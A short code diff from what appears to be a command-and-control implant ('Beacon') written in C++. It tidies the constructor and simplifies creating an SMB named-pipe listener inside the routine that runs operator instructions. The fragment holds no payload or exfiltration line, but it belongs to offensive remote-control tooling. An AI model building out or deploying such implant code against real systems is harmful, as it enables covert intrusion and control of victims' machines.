@@ -86,7 +86,7 @@ IntegrityLevel GetCurrentProcessIntegrityLevel()
 #endif
 
 
-Beacon::Beacon(std::string& ip, int port)
+Beacon::Beacon(const std::string& ip, int port)
 {
 	m_ip = ip;
 	m_port = port;
@@ -445,7 +445,6 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 			if(splitedCmd[1]=="smb")
 			{
 				std::string pipeName = splitedCmd[2];
-				int localPort = 0;
 
 				std::vector<unique_ptr<Listener>>::iterator object = 
 					find_if(m_listeners.begin(), m_listeners.end(),
@@ -461,7 +460,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 				}
 				else
 				{
-					std::unique_ptr<ListenerSmb> listenerSmb = make_unique<ListenerSmb>(pipeName, localPort);
+					std::unique_ptr<ListenerSmb> listenerSmb = make_unique<ListenerSmb>(pipeName);
 					std::string listenerHash = listenerSmb->getListenerHash();
 					m_listeners.push_back(std::move(listenerSmb));
 
